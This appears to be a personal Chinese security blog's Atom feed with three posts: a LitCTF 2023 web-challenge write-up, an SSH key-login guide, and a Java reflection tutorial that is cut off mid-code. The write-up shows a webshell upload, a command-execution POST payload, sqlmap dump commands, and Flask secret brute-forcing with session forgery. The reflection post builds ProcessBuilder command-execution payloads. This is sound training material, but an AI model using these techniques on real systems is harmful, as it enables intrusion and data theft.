<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Nack0c&#39;s home</title>
  
  <subtitle>ChenQing Hou</subtitle>
  <link href="https://nack0c.github.io/atom.xml" rel="self"/>
  
  <link href="https://nack0c.github.io/"/>
  <updated>2023-05-22T05:57:12.830Z</updated>
  <id>https://nack0c.github.io/</id>
  
  <author>
    <name>Nack0c</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2023-LitCTF复现</title>
    <link href="https://nack0c.github.io/posts/7cd63dc4/"/>
    <id>https://nack0c.github.io/posts/7cd63dc4/</id>
    <published>2023-05-22T13:00:18.000Z</published>
    <updated>2023-05-22T05:57:12.830Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2023-LitCTF复现"><a href="#2023-LitCTF复现" class="headerlink" title="2023-LitCTF复现"></a>2023-LitCTF复现</h2><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="导弹迷踪"><a href="#导弹迷踪" class="headerlink" title="导弹迷踪"></a>导弹迷踪</h4><div class="tip info"><p>你是一颗导弹，你需要，飞到最后！（通过6道关卡就能拿到flag哦~<br>Flag形式 NSSCTF{}</p></div><p>查看源代码找到相关JS。得到flag。</p><p><img src="/images/CTF/2023-LitCTF复现\image-2.png" alt="image-2"></p><h4 id="PHP是世界上最好的语言！！"><a href="#PHP是世界上最好的语言！！" class="headerlink" title="PHP是世界上最好的语言！！"></a>PHP是世界上最好的语言！！</h4><div class="tip info"><p>探姬坚信PHP是世界上最好的语言，于是她用PHP写了一个小工具 （Flag位于根目录）<br>Flag形式 NSSCTF{}</p></div><font size=3>打开右侧是代码输入框，尝试进行php命令执行，拿到flag</font><p><img src="/images/CTF/2023-LitCTF复现\image-7.png" alt="image-7"></p><h4 id="1zjs"><a href="#1zjs" class="headerlink" title="1zjs"></a>1zjs</h4><div class="tip info"><p>js….?不确定，再看看。<br>Flag形式 NSSCTF{}</p></div><font size=3 >查看源代码发现一个可疑的文件</font><p><img src="/images/CTF/2023-LitCTF复现\image-3.png" alt="image-3"></p><font size=3 >打开发现是JSFuck编码，直接 Google Console 解码</font><p><img src="/images/CTF/2023-LitCTF复现\image-4.png" alt="image-4"></p><h4 id="我Flag呢"><a href="#我Flag呢" class="headerlink" title="我Flag呢"></a>我Flag呢</h4><div class="tip info"><p>奇怪，放哪里了，怎么看不见呢？（初级难度）</p></div><font size=3>题目提示右键查看源代码，拿到flag</font><p><img src="/images/CTF/2023-LitCTF复现\image-8.png" alt="image-7"></p><h4 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h4><div class="tip info"><p>看看能PING出什么<br>Flag形式 NSSCTF{}</p></div><font size=3>尝试进行管道符进行拼接执行命令发现被过滤</font><p><img src="/images/CTF/2023-LitCTF复现\image-9.png" alt="image-9"></p><font size=3>查看源码发现是前端进行的过滤，直接禁用js</font><p><img src="/images/CTF/2023-LitCTF复现\image-10.png" alt="image-10"></p><font size=3>拿到flag</font><p><img src="/images/CTF/2023-LitCTF复现\image-11.png" alt="image-11"></p><h4 id="Follow-me-and-hack-me"><a href="#Follow-me-and-hack-me" class="headerlink" title="Follow me and hack me"></a>Follow me and hack me</h4><font size=3>根据题意传入GET和POST</font><p><img src="/images/CTF/2023-LitCTF复现\image-12.png" alt="image-12"></p><h4 id="作业管理系统"><a href="#作业管理系统" class="headerlink" title="作业管理系统"></a>作业管理系统</h4><div class="tip info"><p>交作业！！但是哪里不对？</p></div><font size=3>右键查看源码，发现默认登录密码：admin/admin</font><p><img src="/images/CTF/2023-LitCTF复现\image-13.png" alt="image-13"></p><font size=3>发现文件上传点，传入godzilla 一句话</font><p><img src="/images/CTF/2023-LitCTF复现\image-14.png" alt="image-14"></p><font size=3>成功拿到flag~</font><p><img src="/images/CTF/2023-LitCTF复现\image-15.png" alt="image-15"></p><h4 id="Vim-yyds"><a href="#Vim-yyds" class="headerlink" title="Vim yyds"></a>Vim yyds</h4><font size=3>这道题很有意思，考点在Linux vim由于异常退出会产生 </font><font size=3 coler=red>.swp</font><font size=3>文件</font>。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第一次意外退出产生的备份文件名为:.filename.swp</span><br><span class="line">第二次意外退出产生的备份文件名为:.filename.swo</span><br><span class="line">第三次意外退出产生的备份文件名为:.filename.swn</span><br><span class="line">---------------------------------------------</span><br><span class="line">当vim在编辑文档的过程中如果异常退出,则会产生缓存文件。第一次产生的缓存文件后缀为.swp,第二次则产生的缓存文件后缀为.swo,第三次产生的缓存文件后缀为.swn。</span><br></pre></td></tr></table></figure><font size=3>访问/.index.php.swp</font><p><img src="/images/CTF/2023-LitCTF复现\image-16.png" alt="image-16"></p><font size=3>拿到swp文件打开发现是一个webshell，还有必须base64编码提交的值。</font><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])); </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] ===<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$password</span>))</span><br><span class="line">    <span class="variable">$password</span> = <span class="string">&quot;Give_Me_Your_Flag&quot;</span>; </span><br></pre></td></tr></table></figure><p><img src="/images/CTF/2023-LitCTF复现\image-17.png" alt="image-17"></p><font size=3>post提交拿到flag</font><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：password=R2l2ZV9NZV9Zb3VyX0ZsYWc=&amp;&amp;cmd=cat /flag</span><br></pre></td></tr></table></figure><p><img src="/images/CTF/2023-LitCTF复现\image-18.png" alt="image-18"></p><h4 id="Http-pro-max-plus"><a href="#Http-pro-max-plus" class="headerlink" title="Http pro max plus"></a>Http pro max plus</h4><font size=3 >这道题还是比较有趣的，考察HTTP请求包的相关知识</font><p><img src="/images/CTF/2023-LitCTF复现\image-19.png" alt="image-19"></p><font size=3 >这里有两种方式一种是通过 X-Forwarded-For 还有就是 Client-Ip</font><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For </span><br><span class="line">Client-Ip</span><br></pre></td></tr></table></figure><p><img src="/images/CTF/2023-LitCTF复现\image-20.png" alt="image-20"></p><font size=3 >尝试另外一种方式</font><p><img src="/images/CTF/2023-LitCTF复现\image-21.png" alt="image-21"></p><font size=3 >You are not from pornhub.com 这是来源地址。那我们填上(Referer)。</font><p><img src="/images/CTF/2023-LitCTF复现\image-22.png" alt="image-22"></p><font size=3 >继续配置User-Agent</font><p><img src="/images/CTF/2023-LitCTF复现\image-23.png" alt="image-23"></p><font size=3 >继续配置代理(Via)，这个我也是头一次用~</font><p><img src="/images/CTF/2023-LitCTF复现\image-24.png" alt="image-24"></p><font size=3 >继续访问它提示的地址</font><p><img src="/images/CTF/2023-LitCTF复现\image-25.png" alt="image-25"></p><font size=3 >html提示信息继续访问。拿到flag。</font><p><img src="/images/CTF/2023-LitCTF复现\image-26.png" alt="image-26"></p><h4 id="这是什么？SQL注一下"><a href="#这是什么？SQL注一下" class="headerlink" title="这是什么？SQL注一下"></a>这是什么？SQL注一下</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT username,password FROM users WHERE id = &quot;</span>.<span class="string">&#x27;((((((&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>].<span class="string">&#x27;))))))&#x27;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><font size=3 color=red>. 后面拼接了id参数，造成了SQL注入</font><font size=3>sqlmap 跑一下</font><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. sqlmap -u http://node1.anna.nssctf.cn:28547/?id=2 --dbs</span><br><span class="line">2. sqlmap -u http://node1.anna.nssctf.cn:28547/?id=2 --tables -D ctftraining</span><br><span class="line">3. sqlmap -u http://node1.anna.nssctf.cn:28547/?id=2 --dump -D ctftraining -T flag</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/CTF/2023-LitCTF复现\image-27.png" alt="image-27"></p><h4 id="Flag-点击就送！"><a href="#Flag-点击就送！" class="headerlink" title="Flag 点击就送！"></a>Flag 点击就送！</h4><font size=3 >大型Flag赠送活动开始啦，不过只有管理员才能拿到。</font><font size=3>输入admin被拦截</font>。![image-28](/images/CTF/2023-LitCTF复现\image-28.png)![image-29](/images/CTF/2023-LitCTF复现\image-29.png)<font size=3>查看web框架发现是flask，输入其他用户。</font><p><img src="/images/CTF/2023-LitCTF复现\image-30.png" alt="image-30"></p><font size=3>session 发现有点疑似 base64 ，解码发现是json的形式，然后就会想到 flask伪造session。</font><p><img src="/images/CTF/2023-LitCTF复现\image-31.png" alt="image-31"></p><font size=3 >但是我们不知道密钥是什么，构造一个字典，</font><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># cat pass.txt                                   </span></span><br><span class="line">pass</span><br><span class="line">admin</span><br><span class="line">....</span><br><span class="line">LitCTF</span><br><span class="line">LitCTF2023</span><br></pre></td></tr></table></figure><font size=3>使用flask-unsign 爆破。</font><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install flask-unsign</span><br><span class="line">flask-unsign --unsign --cookie &quot;eyJuYW1lIjoiTmFjazBjIn0.ZGrrLQ.1Lt6zZVPO5Xvwab_mtVMflMzHsE&quot; -w .\pass.txt --no-literal-eval</span><br></pre></td></tr></table></figure><p><img src="/images/CTF/2023-LitCTF复现\image-32.png" alt="image-32"></p><div class="tip success"><p>密钥：LitCTF</p></div><font size=3 >使用flask-session 伪造session.</font><font size=3>flask-session 脚本地址：https://github.com/noraj/flask-session-cookie-manager</font><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -s <span class="string">&quot;LitCTF&quot;</span> -t <span class="string">&#x27;&#123;\&quot;name\&quot;:\&quot;admin\&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/images/CTF/2023-LitCTF复现\image-33.png" alt="image-33"></p><div class="tip key"><p>eyJuYW1lIjoiYWRtaW4ifQ.ZGrvlA.b62cLtFGF_0e8yCTbGEjudQ7Drc</p></div><p><img src="/images/CTF/2023-LitCTF复现\image-34.png" alt="image-34"></p><font size=3>Cookie Editor 有时候不太好用需要多次尝试才可以，使用抓包更好~</font><p><img src="/images/CTF/2023-LitCTF复现\image-35.png" alt="image-35"></p><h4 id="就当无事发生"><a href="#就当无事发生" class="headerlink" title="就当无事发生"></a>就当无事发生</h4><div class="tip info"><p><a href="https://ProbiusOfficial.github.io">https://ProbiusOfficial.github.io</a><br>差点数据没脱敏就发出去了，还好还没来得及部署，重新再pull一次（x</p></div><div class="tip cogs"><p>Github.io 是一个github的博客网站，我自己也有一个，直接到github去看是否泄露了信息。</p></div><p><img src="/images/CTF/2023-LitCTF复现\image-36.png" alt="image-36"></p><font size=3>然后我们找到博客的commit 发现有一次提交失败了，点进去查看相关错误信息。</font><p><img src="/images/CTF/2023-LitCTF复现\image-37.png" alt="image-37"></p><font size=3>全局搜索，拿到flag</font>。![image-38](/images/CTF/2023-LitCTF复现\image-38.png)#### 彩蛋(综合)<div class="tip info"><p>这道题考察是之前几道 web 的彩蛋题。需要开启之前的环境去寻找彩蛋。</p></div>##### 第一个彩蛋(我Flag呢)<font size=3>第一个彩蛋藏在 google console中。</font><p><img src="/images/CTF/2023-LitCTF复现\image-39.png" alt="image-39"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;First_t0_The_k3y! (1/?) </span><br><span class="line">多留意一下哦~ 说不定就找到下一个了呢~  </span><br></pre></td></tr></table></figure><h5 id="第二个彩蛋-作业管理系统"><a href="#第二个彩蛋-作业管理系统" class="headerlink" title="第二个彩蛋(作业管理系统)"></a>第二个彩蛋(作业管理系统)</h5><font size=3>存在于上传功能点。</font><p><img src="/images/CTF/2023-LitCTF复现\image-42.png" alt="image-42"></p><p><img src="/images/CTF/2023-LitCTF复现\image-43.png" alt="image-43"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wow 你找到了第二个彩蛋哦~</span><br><span class="line">_S0_ne3t? (2/?)</span><br></pre></td></tr></table></figure><h5 id="第三个彩蛋-Follow-me-and-hack-me"><a href="#第三个彩蛋-Follow-me-and-hack-me" class="headerlink" title="第三个彩蛋(Follow me and hack me)"></a>第三个彩蛋(Follow me and hack me)</h5><font size=3>dirsearch 扫了一下目录，发现www.zip</font><p><img src="/images/CTF/2023-LitCTF复现\image-40.png" alt="image-40"></p><p><img src="/images/CTF/2023-LitCTF复现\image-41.png" alt="image-41"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第三个彩蛋！(看过头号玩家么？)</span><br><span class="line">_R3ady_Pl4yer_000ne_ (3/?)</span><br></pre></td></tr></table></figure><h5 id="第四个彩蛋-狠狠的注入"><a href="#第四个彩蛋-狠狠的注入" class="headerlink" title="第四个彩蛋(狠狠的注入)"></a>第四个彩蛋(狠狠的注入)</h5><p><font size=3>这题….</font><img src="/images/CTF/2023-LitCTF复现\image-44.png" alt="image-44"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F1rst_to_Th3_eggggggggg!&#125;</span><br></pre></td></tr></table></figure><div class="tip bell"><p>NSSCTF{First_t0_The_k3y!_S0_ne3t?_R3ady_Pl4yer_000ne_F1rst_to_Th3_eggggggggg!}</p></div><div class="tip success"><p>至此 web 已复现完毕~</p></div>]]></content>
    
    
    <summary type="html">如有不对，请师父不吝赐教~</summary>
    
    
    
    <category term="CTF Contest" scheme="https://nack0c.github.io/categories/CTF-Contest/"/>
    
    
    <category term="CTF" scheme="https://nack0c.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Windows下SSH配置私钥登录</title>
    <link href="https://nack0c.github.io/posts/24a5dd33/"/>
    <id>https://nack0c.github.io/posts/24a5dd33/</id>
    <published>2023-05-19T00:03:18.000Z</published>
    <updated>2023-05-22T05:57:12.830Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Windows下SSH配置私钥登录"><a href="#Windows下SSH配置私钥登录" class="headerlink" title="Windows下SSH配置私钥登录"></a>Windows下SSH配置私钥登录</h2><div class="tip info"><p>SSH（Secure Shell）是一种网络协议，用于在不安全的网络上安全地进行远程登录和文件传输。SSH使用公钥密码学来验证远程计算机的身份并加密通信。</p></div><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><div class="tip home"><ol><li>生成密钥对：首先，在本地计算机上生成一对密钥，包括一个私钥和一个公钥。可以使用SSH密钥生成工具（如OpenSSH）来生成密钥对。</li><li>配置公钥：将生成的公钥复制到要连接的远程服务器上。一般情况下，公钥存储在远程服务器上的~/.ssh/authorized_keys文件中。</li><li>启用SSH连接：在远程服务器上启用SSH服务，以便允许使用密钥进行身份验证。大多数Linux和Unix系统默认启用SSH服务，但您可能需要检查和配置服务器上的SSH配置文件（如/etc/ssh/sshd_config）。</li><li>SSH连接过程：当您尝试通过SSH连接到远程服务器时，本地计算机会使用私钥对通信进行加密。远程服务器会验证您的身份是否与公钥匹配。如果验证成功，您将获得对服务器的访问权限。</li></ol></div><h3 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h3><h4 id="生成密钥对"><a href="#生成密钥对" class="headerlink" title="生成密钥对"></a>生成密钥对</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 2048</span><br></pre></td></tr></table></figure><p><strong><font size=3 color=Blue>默认会生成公钥(id_rsa.pub)和私钥(id_rsa)</font></strong></p><div class="tip key"><p>这将生成一个 RSA 密钥对，包括私钥（id_rsa）和公钥（id_rsa.pub）。默认情况下，它们将存储在 %USERPROFILE%.ssh\ 目录下。</p></div><p><img src="/images/运维小记/Windows下SSH配置私钥登录/image-2.png" alt="image-20230519011658554"></p><h4 id="复制公钥文件到服务端"><a href="#复制公钥文件到服务端" class="headerlink" title="复制公钥文件到服务端"></a>复制公钥文件到服务端</h4><p><strong><font size=3 color=green>将公钥复制到 Linux 服务器：将您生成的公钥文件（id_rsa.pub）的内容复制到您要连接的 Linux 服务器的 ~/.ssh/authorized_keys 文件中。</font></strong></p><p><img src="/images/运维小记/Windows下SSH配置私钥登录/image-4.png" alt="image-20230519011658554"></p><p><img src="/images/运维小记/Windows下SSH配置私钥登录/image-3.png" alt="image-20230519011255298"></p><h4 id="修改-ssh-服务端配置文件"><a href="#修改-ssh-服务端配置文件" class="headerlink" title="修改 ssh 服务端配置文件"></a>修改 ssh 服务端配置文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PubkeyAuthentication <span class="built_in">yes</span></span><br><span class="line">AuthorizedKeysFile      .ssh/author_keys</span><br><span class="line"><span class="comment"># restart sshd server</span></span><br><span class="line">systemctl restart sshd</span><br><span class="line"><span class="comment"># service sshd restart</span></span><br></pre></td></tr></table></figure><p><img src="/images/运维小记/Windows下SSH配置私钥登录/image-5.png" alt="image-20230519011802891"></p><h4 id="服务端私钥连接"><a href="#服务端私钥连接" class="headerlink" title="服务端私钥连接"></a>服务端私钥连接</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh [user]@[ip] -p [port] -i id_rsa</span><br><span class="line">ssh root@127.0.0.1 -p 22 -i id_rsa</span><br></pre></td></tr></table></figure><p><img src="/images/运维小记/Windows下SSH配置私钥登录/image-6.png" alt="image-20230519011802891"></p><p><strong><font size=3 color=Red>此处有坑~</font></strong></p><p><img src="/images/运维小记/Windows下SSH配置私钥登录/image-7.png" alt="image-20230519011802891"></p><div class="tip error"><p>Linux下我们需要改变私钥的权限,否则就会报错</p></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 /path/to/private_key</span><br></pre></td></tr></table></figure><div class="tip error"><p>Windows也同样下我们需要改变私钥的权限。</p></div><p><img src="/images/运维小记/Windows下SSH配置私钥登录/image-8.png" alt="image-20230519011802891"></p><p><img src="/images/运维小记/Windows下SSH配置私钥登录/image-9.png" alt="image-20230519011802891"></p><p><img src="/images/运维小记/Windows下SSH配置私钥登录/image-10.png" alt="image-20230519011802891"></p><p><strong><font size=3 color=Red>用户目录在这边~  C:\Users</font></strong></p><p><img src="/images/运维小记/Windows下SSH配置私钥登录/image-11.png" alt="image-20230519011802891"></p><p><strong><font size=3 color=Red>再次尝试</font></strong></p><p><img src="/images/运维小记/Windows下SSH配置私钥登录/image-12.png" alt="image-20230519011802891"></p><h3 id="为什么要用私钥进行连接？"><a href="#为什么要用私钥进行连接？" class="headerlink" title="为什么要用私钥进行连接？"></a>为什么要用私钥进行连接？</h3><p><strong><font size=3 color=orange>这种SSH私钥公钥连接方式具有以下优点：</font></strong></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">安全性：SSH私钥和公钥连接使用公钥密码学提供了更高的安全性。私钥存储在本地计算机上，不会被传输到网络中，从而减少了私钥被攻击者获取的风险。</span><br><span class="line"></span><br><span class="line">免密码登录：使用SSH私钥公钥连接，您可以在不输入密码的情况下远程登录到服务器。这对于自动化脚本和批处理操作非常方便。</span><br><span class="line"></span><br><span class="line">强大的身份验证：SSH私钥和公钥连接使用了强大的公钥密码学算法，提供了更可靠的身份验证机制，远远超过了基于密码的身份验证。</span><br><span class="line"></span><br><span class="line">总结起来，SSH私钥公钥连接是一种更安全和便捷的身份验证方式，适用于远程登录和文件传输等场景。它通过使用密钥对进行加密和身份验证，提供了更高的安全性和便利性。</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">SSH私钥连接的小坑</summary>
    
    
    
    
    <category term="运维小记" scheme="https://nack0c.github.io/tags/%E8%BF%90%E7%BB%B4%E5%B0%8F%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>反射篇-3</title>
    <link href="https://nack0c.github.io/posts/27e91d96/"/>
    <id>https://nack0c.github.io/posts/27e91d96/</id>
    <published>2023-05-17T12:40:45.000Z</published>
    <updated>2023-05-22T05:57:12.830Z</updated>
    
    <content type="html"><![CDATA[<p>  延续上次简单的命令执行 payload ，遗留下来两个问题：</p><ul><li>如果一个类没有无参构造方法，也没有类似于单例模式里的静态方法，我们怎么通关反射实例化该类呢？</li><li>如果一个方法或构造方法是私有方法，我们是否能执行它？</li></ul><div class="note success simple"><p>第一个问题，我们需要用到一个新的反射方法 getConstructor 。<br>和 getMethod 类似，getConstructor 接收的参数是构造函数列表类型，因为构造函数也支持重载，所以必须用参数列表类型才能唯一确定一个构造函数。<br>获取构造函数后，我们使用 newInstance 来执行。</p></div><p>Java 重载：方法重载指同一个类中定义的多个方法之间的关系,满足下列条件的多个方法相互构成重载: 多个方法在同一个类中 多个方法具有相同的方法名 多个方法的参数不相同,类型不同或者数量不同。</p><div class="note info simple"><p>比如，我们常用的另一种执行命令的方式 PorcessBuilder ，我们使用反射来获取其构造函数，然后调用 start() 来执行命令。</p></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        ((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc&quot;</span>))).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看到 ProcessBuilder 有两个构造函数：</p><ul><li>public ProcessBuilder(List<String> command)</li><li>public ProcessBuilder(String… command)</li></ul><p><img src="https://i.328888.xyz/2023/05/17/VVktMV.png" alt="image.png"><br>上面用到了第一个形式的构造函数，所以我们在 getConstructor 传入的是 List.class 。<br>但是我们看到，前面的 payload 用到了强制类型转换，有时候我们利用漏洞的时候是没有这种语法的，所以我们仍需利用反射完成这一步。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line"><span class="comment">//        ((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList(&quot;calc&quot;))).start();</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">calc</span> <span class="operator">=</span> clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc&quot;</span>));</span><br><span class="line">        clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(calc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br> 通过 getMethod(“start”) 获取到 start 方法，然后 invoke 执行， invoke 的第一个参数就是 ProcessBuilder Object 了。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        ((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;)).start();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>那么我们如果要使用 public ProcessBuilder(String… command) 这个构造函数，需要怎样用反射执行呢？<br>这又涉及到 Java 里的可变长参数（varargs）了。正如其他语言一样，Java也支持可变长参数，就是当你定义函数的时候不确定参数数量的时候，可以使用 … 这样的语言来表示 ”这个函数的参数个数是可变的“。<br>对于可变长参数，Java其实在编译的时候会编译成一个数组，也就是说，下面两种写法在底层是等价的（也就不能重载）<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span> <span class="params">(String[] names)</span>&#123;&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span> <span class="params">(String... names)</span>&#123;&#125;</span><br></pre></td></tr></table></figure><br>也由此，如果我们有一个数组，想传给 hello 函数，只需<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String names[] = &#123;<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;world&quot;</span>&#125;;</span><br><span class="line">hello(names);</span><br></pre></td></tr></table></figure></p><p>那么对于反射来说，如果要获取的布标函数里包含可变长参数，我们认为它是数组就行了。<br>所以我们将字符串数组类 String[].class 传给 getContructor ，获取 ProcessBuilder 的第二种构造函数：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">class.getConstrctor(<span class="string">&quot;String[].class&quot;</span>);</span><br></pre></td></tr></table></figure><br>在调用 newInstance 的时候，因为这个函数本身接受的是一个可变长参数，我们传给 ProcessBuilder 的也是一个可变长参数，二者叠加为一个二维数组，payload 如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;)).start();</span><br></pre></td></tr></table></figure><br>反射编写：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> </span><br><span class="line">    clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span 